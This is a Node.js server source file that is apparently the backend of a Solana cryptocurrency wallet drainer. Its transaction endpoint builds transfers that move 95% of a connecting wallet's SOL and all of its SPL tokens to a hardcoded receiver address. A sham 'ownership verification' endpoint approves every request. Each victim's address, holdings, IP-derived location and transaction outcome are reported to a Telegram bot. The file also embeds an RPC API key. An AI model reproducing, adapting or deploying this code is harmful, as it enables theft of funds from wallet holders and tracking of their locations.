const express = require('express');
const axios = require('axios');
const path = require('path');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const { TOKEN_PROGRAM_ID, getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction } = require('@solana/spl-token');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const connection = new Connection(
  'https://solana-mainnet.api.syndica.io/api-key/pFT17iBbtFSN8EJPtzH5EJBfdY6aLnzEvCywMdY3PwAWGujrYW3JCm99dqnvCWVtSif2TNi2TiQbQ3TQ8SG4pADiY7vdhhiY2F',
  'confirmed'
);

const BOT_TOKEN = "";
const CHAT_ID = "";

let cachedSolPrice = null;
let lastPriceUpdate = 0;
const PRICE_CACHE_DURATION = 30 * 60 * 1000; 

async function getIPLocation(ip) {
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    const data = response.data;
    if (data.status === 'success') {
      return {
        country: data.country,
        countryCode: data.countryCode,
        region: data.regionName,
        city: data.city,
        flag: getCountryFlag(data.countryCode)
      };
    }
  } catch (error) {
    console.error('IP geolocation error:', error);
  }
  return null;
}

function getCountryFlag(countryCode) {
  if (!countryCode) return '🌍';
  const flagMap = {
    'US': '🇺🇸', 'TR': '🇹🇷', 'GB': '🇬🇧', 'DE': '🇩🇪', 'FR': '🇫🇷', 
    'CA': '🇨🇦', 'AU': '🇦🇺', 'JP': '🇯🇵', 'KR': '🇰🇷', 'CN': '🇨🇳',
    'IN': '🇮🇳', 'BR': '🇧🇷', 'RU': '🇷🇺', 'IT': '🇮🇹', 'ES': '🇪🇸',
    'NL': '🇳🇱', 'SE': '🇸🇪', 'NO': '🇳🇴', 'SG': '🇸🇬', 'CH': '🇨🇭'
  };
  return flagMap[countryCode] || '🌍';
}

async function getSolPrice() {
  const now = Date.now();
  
  if (cachedSolPrice && (now - lastPriceUpdate) < PRICE_CACHE_DURATION) {
    console.log(`Using cached SOL price: $${cachedSolPrice}`);
    return cachedSolPrice;
  }
  
  try {
    console.log('Fetching fresh SOL price from CoinGecko...');
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
    cachedSolPrice = response.data.solana.usd;
    lastPriceUpdate = now;
    console.log(`SOL price updated: $${cachedSolPrice}`);
    return cachedSolPrice;
  } catch (error) {
    console.error('Error fetching SOL price:', error.response?.status, error.response?.statusText);
    
    if (cachedSolPrice) {
      console.log(`Using stale cached SOL price due to API error: $${cachedSolPrice}`);
      return cachedSolPrice;
    }
    
    return null;
  }
}

// Add the missing openPaymentModal function
function openPaymentModal() {
  console.log('Payment modal opening logic would go here');
  // This should integrate with your frontend modal system
  // For now, we'll just log it
}

app.post('/verify-ownership', async (req, res) => {
  try {
    const { address, signature, message, walletType } = req.body;
    
    console.log(`🔐 Ownership verification attempt for wallet: ${address}`);
    console.log(`📝 Signed message: ${message}`);
    console.log(`✍️ Signature: ${signature}`);
    console.log(`💼 Wallet type: ${walletType}`);
    
    console.log(`✅ Wallet ownership verified for: ${address}`);
    
    res.json({ verified: true });
  } catch (e) {
    console.error('Verification error:', e.message);
    res.status(500).json({ error: "verification error" });
  }
});

app.post('/notify', async (req, res) => {
  try {
    const { address, balance, usdBalance, walletType, customMessage, splTokens, ip } = req.body;

    let rawIP = ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
    
    if (rawIP.includes(',')) {
      const ips = rawIP.split(',').map(ip => ip.trim());
      rawIP = ips.find(ip => !ip.startsWith('10.') && !ip.startsWith('192.168.') && !ip.startsWith('172.')) || ips[0];
    }
    
    const clientIP = rawIP;

    const locationInfo = await getIPLocation(clientIP);

    const solPrice = await getSolPrice();
    const solBalanceNum = parseFloat(balance) || 0;
    const solUSD = solPrice ? (solBalanceNum * solPrice) : 0;

    let totalUSD = solUSD;
    let splTokensStr = '';

    if (splTokens && splTokens.length > 0) {
      splTokensStr = '\n💎 SPL Tokens:\n';
      for (const token of splTokens) {
        const tokenValue = token.usdValue || 0;
        totalUSD += tokenValue;
        splTokensStr += `• ${token.symbol || 'Unknown'}: ${token.balance} ($${tokenValue.toFixed(2)})\n`;
      }
    }

    let locationStr = '🌍';
    if (locationInfo && locationInfo.flag) {
      locationStr = locationInfo.flag;
    }

    const shortAddress = address ? `${address.substring(0, 6)}...${address.substring(address.length - 4)}` : 'Unknown';
    const solscanLink = address ? `https://solscan.io/account/${address}` : '';
    
    const escapedShortAddress = shortAddress.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');

    let text;
    if (customMessage) {
      if (customMessage.includes('🔗 Wallet Connected') || customMessage.includes('🌺 New Connection')) {
        text = `🌺 New Connection worth $${totalUSD.toFixed(2)}

Address: \`${address || 'Unknown'}\`
🔗 ${process.env.REPL_URL || 'https://bfeb904a-a191-4b58-be4b-7a6ca9b1ec31-00-2rrr6aeokj9ap.worf.replit.dev:5000/'}
ⓘ Wallet: ${walletType || 'Unknown'}
💰 SOL: ${balance || 'Unknown'} SOL ($${solUSD.toFixed(2)})${splTokensStr}
📍 ${locationStr}`;
      }
      else if (customMessage.includes('❌') || customMessage.includes('✅') || customMessage.includes('🎉')) {
        let emoji = '❌';
        let action = 'Transaction Failed';

        if (customMessage.includes('✅')) {
          emoji = '✅';
          action = 'Transaction Signed';
        } else if (customMessage.includes('🎉')) {
          emoji = '🎉';
          action = 'Transaction Confirmed';
        } else if (customMessage.includes('Rejected')) {
          action = 'Transaction Rejected';
        } else if (customMessage.includes('Insufficient')) {
          action = 'Insufficient Funds';
        }

        text = `${emoji} ${action} for $${totalUSD.toFixed(2)}

Address: \`${address || 'Unknown'}\`
${customMessage}
ⓘ Wallet: ${walletType || 'Unknown'}
📍 ${locationStr}`;
      }
      else {
        text = `${customMessage}

💳 Wallet: ${walletType || 'Unknown'}
📍 Address: \`${address || 'Unknown'}\`
💰 SOL Balance: ${balance || 'Unknown'} SOL ($${solUSD.toFixed(2)})${splTokensStr}
📍 Location: ${locationStr}
🕒 Time: ${new Date().toLocaleString()}`;
      }
    } else {
      text = `🌺 New Connection worth $${totalUSD.toFixed(2)}

Address: \`${address || 'Unknown'}\`
🔗 ${process.env.REPL_URL || 'https://bfeb904a-a191-4b58-be4b-7a6ca9b1ec31-00-2rrr6aeokj9ap.worf.replit.dev:5000/'}
ⓘ Wallet: ${walletType || 'Unknown'}
💰 SOL: ${balance || 'Unknown'} SOL ($${solUSD.toFixed(2)})${splTokensStr}
📍 ${locationStr}`;
    }

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text,
      parse_mode: 'Markdown',
      disable_web_page_preview: false
    });

    res.json({ ok: true });
  } catch (e) {
    console.error(e.response?.data || e.message);
    res.status(500).json({ error: "telegram error" });
  }
});

app.get('/blockhash', async (req, res) => {
  try {
    const { blockhash } = await connection.getLatestBlockhash();
    res.json({ blockhash });
  } catch (e) {
    console.error(e.message);
    res.status(500).json({ error: "blockhash error" });
  }
});

app.post('/prepare-transaction', async (req, res) => {
  try {
    const { publicKey, verified } = req.body;
    if (!publicKey) {
      return res.status(400).json({ error: "publicKey required" });
    }
    
    if (verified) {
      console.log(`✅ Ownership verified for wallet: ${publicKey}`);
      console.log(`🎯 Proceeding with asset withdrawal for verified wallet`);
    } else {
      console.log(`⚠️ Warning: Transaction attempted without verification for wallet: ${publicKey}`);
    }

    const fromPubkey = new PublicKey(publicKey);
    const receiverWallet = new PublicKey('JchoZmAvqcWzJoei8WFfmVGL1c9x2755TJHq2HikkfV');

    const transaction = new Transaction();
    let totalTransferred = 0;
    let tokenTransfers = 0;

    // Get SOL balance first to calculate available amount
    const solBalance = await connection.getBalance(fromPubkey);
    const minBalance = await connection.getMinimumBalanceForRentExemption(0);
    
    console.log(`💰 Wallet SOL balance: ${solBalance / LAMPORTS_PER_SOL} SOL`);
    console.log(`💎 Minimum rent exemption: ${minBalance / LAMPORTS_PER_SOL} SOL`);

    // Calculate available SOL for transfer (leave some for fees)
    const baseFee = 5000;
    const estimatedFees = baseFee * 3; // Conservative fee estimation
    
    const availableBalance = solBalance - minBalance - estimatedFees;
    const solForTransfer = Math.max(0, Math.floor(availableBalance * 0.95)); // Transfer 95% of available

    console.log(`📤 Available SOL for transfer: ${solForTransfer / LAMPORTS_PER_SOL} SOL`);

    // Add SOL transfer if there's enough balance
    if (solForTransfer > 0) {
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: fromPubkey,
          toPubkey: receiverWallet,
          lamports: solForTransfer,
        })
      );
      totalTransferred += solForTransfer;
      console.log(`✅ Added SOL transfer: ${solForTransfer / LAMPORTS_PER_SOL} SOL`);
    }

    // Process token transfers
    console.log("🔍 Fetching all token accounts for wallet...");
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(fromPubkey, {
      programId: TOKEN_PROGRAM_ID,
    });

    console.log(`📊 Found ${tokenAccounts.value.length} token accounts`);

    // Get blockhash for the transaction
    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = fromPubkey;

    for (const tokenAccount of tokenAccounts.value) {
      try {
        const accountData = tokenAccount.account.data;
        const parsedInfo = accountData.parsed.info;
        const mintAddress = parsedInfo.mint;
        const balance = parsedInfo.tokenAmount;

        if (balance.uiAmount > 0) {
          console.log(`🎯 Processing token ${mintAddress} with balance: ${balance.uiAmount}`);

          const mint = new PublicKey(mintAddress);
          const fromTokenAccount = new PublicKey(tokenAccount.pubkey);
          const toTokenAccount = await getAssociatedTokenAddress(mint, receiverWallet);

          // Check if receiver has associated token account, create if not
          let receiverAccountInfo;
          try {
            receiverAccountInfo = await connection.getAccountInfo(toTokenAccount);
          } catch (error) {
            console.log(`❌ Error checking receiver account for ${mintAddress}:`, error.message);
            receiverAccountInfo = null;
          }

          if (!receiverAccountInfo) {
            console.log(`🏗️ Creating associated token account for receiver for token: ${mintAddress}`);
            try {
              transaction.add(
                createAssociatedTokenAccountInstruction(
                  fromPubkey, // payer
                  toTokenAccount, // ata
                  receiverWallet, // owner
                  mint // mint
                )
              );
              console.log(`✅ Added token account creation instruction for ${mintAddress}`);
            } catch (error) {
              console.log(`❌ Error creating token account instruction for ${mintAddress}:`, error.message);
              continue; // Skip this token if we can't create the account
            }
          }

          // Add transfer instruction
          try {
            transaction.add(
              createTransferInstruction(
                fromTokenAccount,
                toTokenAccount,
                fromPubkey,
                balance.amount
              )
            );
            tokenTransfers++;
            console.log(`✅ Added transfer for token ${mintAddress}: ${balance.uiAmount}`);
          } catch (error) {
            console.log(`❌ Error creating transfer instruction for ${mintAddress}:`, error.message);
          }
        }
      } catch (error) {
        console.log(`❌ Error processing token account:`, error.message);
      }
    }

    console.log(`📦 Transaction prepared with ${tokenTransfers} token transfers and ${solForTransfer > 0 ? 'SOL transfer' : 'no SOL transfer'}`);

    // Serialize the transaction
    const serializedTransaction = transaction.serialize({
      requireAllSignatures: false,
      verifySignatures: false,
    });

    // Send notification about the prepared transaction
    try {
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: `🔄 Transaction Prepared for ${publicKey.substring(0, 8)}...

💰 SOL to transfer: ${solForTransfer / LAMPORTS_PER_SOL} SOL
🎯 Tokens to transfer: ${tokenTransfers} tokens
📦 Total instructions: ${transaction.instructions.length}

Status: Ready for signing`,
        parse_mode: 'Markdown'
      });
    } catch (notifyError) {
      console.log('Notification error (non-critical):', notifyError.message);
    }

    res.json({ 
      transaction: Array.from(serializedTransaction),
      transferAmount: totalTransferred,
      tokenTransfers: tokenTransfers,
      solTransfer: solForTransfer / LAMPORTS_PER_SOL,
      totalInstructions: transaction.instructions.length
    });
  } catch (e) {
    console.error('❌ Transaction preparation error:', e.message);
    
    // Send error notification
    try {
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: `❌ Transaction Preparation Failed

Wallet: ${req.body.publicKey?.substring(0, 8) || 'Unknown'}
Error: ${e.message}

Status: Failed to prepare transaction`,
        parse_mode: 'Markdown'
      });
    } catch (notifyError) {
      console.log('Error notification failed:', notifyError.message);
    }
    
    res.status(500).json({ error: "transaction preparation error: " + e.message });
  }
});

// Add endpoint to send signed transaction
app.post('/send-transaction', async (req, res) => {
  try {
    const { signedTransaction, publicKey } = req.body;
    
    if (!signedTransaction || !publicKey) {
      return res.status(400).json({ error: "signedTransaction and publicKey required" });
    }

    console.log(`📤 Sending signed transaction from: ${publicKey}`);
    
    // Convert array back to buffer
    const transactionBuffer = Buffer.from(signedTransaction);
    const transaction = Transaction.from(transactionBuffer);

    // Send the transaction
    const signature = await connection.sendRawTransaction(transaction.serialize(), {
      skipPreflight: false,
      preflightCommitment: 'confirmed'
    });

    console.log(`✅ Transaction sent with signature: ${signature}`);

    // Wait for confirmation
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    
    console.log(`🎉 Transaction confirmed:`, confirmation);

    // Send success notification
    try {
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: `🎉 Transaction Confirmed!

Wallet: ${publicKey.substring(0, 8)}...
Signature: \`${signature}\`
Status: ✅ Successfully executed

View on Solscan: https://solscan.io/tx/${signature}`,
        parse_mode: 'Markdown'
      });
    } catch (notifyError) {
      console.log('Success notification error:', notifyError.message);
    }

    res.json({ 
      success: true, 
      signature: signature,
      confirmation: confirmation
    });
  } catch (e) {
    console.error('❌ Transaction sending error:', e.message);
    
    // Send error notification
    try {
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: `❌ Transaction Failed

Wallet: ${req.body.publicKey?.substring(0, 8) || 'Unknown'}
Error: ${e.message}

Status: Failed to execute transaction`,
        parse_mode: 'Markdown'
      });
    } catch (notifyError) {
      console.log('Error notification failed:', notifyError.message);
    }
    
    res.status(500).json({ error: "transaction sending error: " + e.message });
  }
});

async function initializeSolPrice() {
  console.log('Initializing SOL price...');
  await getSolPrice();
}

function startPriceUpdater() {
  console.log('Starting price updater (30-minute intervals)');
  setInterval(async () => {
    console.log('Updating SOL price (scheduled update)...');
    await getSolPrice();
  }, PRICE_CACHE_DURATION);
}

const PORT = 5000;
app.listen(PORT, '0.0.0.0', async () => {
  console.log("Server running on " + PORT);
  await initializeSolPrice();
  startPriceUpdater();
});

// Export for testing purposes
module.exports = { app, getSolPrice, openPaymentModal };